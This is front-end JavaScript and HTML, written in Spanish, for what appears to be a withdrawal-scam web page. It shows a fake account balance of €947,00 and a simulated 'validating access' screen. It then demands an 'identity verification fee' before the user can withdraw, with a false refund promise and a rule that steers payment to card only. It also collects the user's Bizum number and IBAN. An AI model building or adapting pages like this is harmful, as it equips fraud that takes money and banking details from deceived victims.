...
const pages = {
    ...
    <div class="withdraw-page">
      ...
      <div class="balance-card">
        ...
        <div class="balance-amount-wrapper">
          ...
          <img class="balance-image" src="images/p-saldo-maior.png" alt="icono">
        </div>
      </div>
      ...
      <div class="withdraw-content">
        ...
        <div class="payment-methods-row">
          <div class="payment-method-item">
            <img src="images/mbway-logo.png" alt="Bizum" class="payment-method-logo">
        ...
        <div id="selected-method-display" class="selected-method-display" style="display: none;">
          <div class="method-display-item">
            ...
            <button class="change-method-btn" onclick="openMethodModal()">Cambiar</button>
          </div>
        </div>
        ...
        <button class="add-method-btn" id="add-method-btn">Añadir método de retirada</button>
        
        <!-- Textos Informativos -->
        <div class="withdraw-info-text">
          <p>Para retirar dinero, necesitas un saldo mínimo de €0,40.</p>
          <p>Los límites de retirada para transacciones individuales y mensuales pueden variar según el país o la región.</p>
        </div>
      </div>
    </div>
  `,
  ...
  loading: `
    <div class="loading-page">
      <div class="loading-content">
        ...
        <div class="loading-text">Validando acceso...</div>
    ...
    <div class="confirmation-container">
      ...
      <div class="confirmation-section">
        ...
        <div class="confirmation-fee-description">
          ...
          <span class="bold">€947,00</span>. El importe de
      ...
      <div class="confirmation-section">
        ...
        <div class="confirmation-receipt-grid">
          ...
          <div class="confirmation-receipt-item">
            <div class="confirmation-receipt-label">Importe a recibir</div>
      ...
      <div class="confirmation-section">
        ...
        <div class="confirmation-success-message" id="confirmation-success-message">
          ✅ Identidad confirmada. € 12,97 reembolsados y retirada liberada.
        </div>
      </div>
      ...
      <div class="confirmation-footer">
        ...
        <a href="#nine" class="confirmation-footer-link">¿Necesitas ayuda?</a>
      </div>
    </div>
  `,
  ...
  <div class="video-header">
    MIRA EL VÍDEO DE ABAJO PARA LIBERAR TU RETIRADA Y ACCESO VITALICIO.
  </div>
  ...
  <p class="video-instruction">Mira cómo liberar tu retirada viendo el vídeo.</p>
    ...
    <div class="checkout-page">
      ...
      <div class="checkout-container">
        ...
        <div class="checkout-content">
          ...
          <div class="payment-methods-info">
            ...
            <div>
              ...
              <span id="payment-methods-label">Tarjeta de crédito/débito, Google Pay y Apple Pay</span>
            </div>
          </div>
          <div class="checkout-payment-warning">
            ⚠️ Los pagos por Bizum y transferencia bancaria no están permitidos para la tasa de verificación de identidad, ya que estos métodos comprometen el proceso de reembolso automático.
          </div>
        ...
        <div class="checkout-footer">
          <p>🔒 Pago seguro a través de Cooud</p>
          <p>Serás redirigido al checkout</p>
        </div>
      </div>
    </div>
  `
  ...
  if (method === 'mbway') {
    formHTML = `
      <div class="method-form">
        <h3>Vincular método de recepción</h3>
        ...
        <div class="form-group">
          ...
          <div class="phone-input-wrapper">
            ...
            <input type="tel" class="form-input phone-input" placeholder="Introduce tu número de Bizum" id="mbway-number" pattern="[0-9]*" inputmode="numeric" maxlength="9">
          </div>
        </div>
    ...
    formHTML = `
      <div class="method-form">
        ...
        <div class="form-group">
          ...
          <input type="text" class="form-input" placeholder="Exactamente como figura en el banco" id="iban-name">
        </div>
        <div class="form-group">
          <label>IBAN</label>
          <input type="text" class="form-input" placeholder="Empieza siempre con ES" id="iban-number" pattern="[A-Z0-9]*" inputmode="text" maxlength="34">
        </div>
        <div class="form-group">
          <label>Banco</label>
...
function updateMethodDisplay(method) {
  ...
  if (method === 'mbway') {
    logo.innerHTML = '<img src="images/mbway-logo.png" alt="Bizum" style="width: 50px; height: 35px; object-fit: contain;">';
...
function submitMethodForm() {
  ...
  if (selectedPaymentMethod === 'mbway') {
    ...
    if (!/^\d+$/.test(number)) {
      alert('El número de Bizum debe contener solo números');
      return;
    }
    if (number.length !== 9) {
      alert('El número de Bizum debe tener 9 dígitos');
      return;
    }
    ...
    if (!iban.toUpperCase().startsWith('ES')) {
      alert('El IBAN debe empezar con ES');
      return;
    }
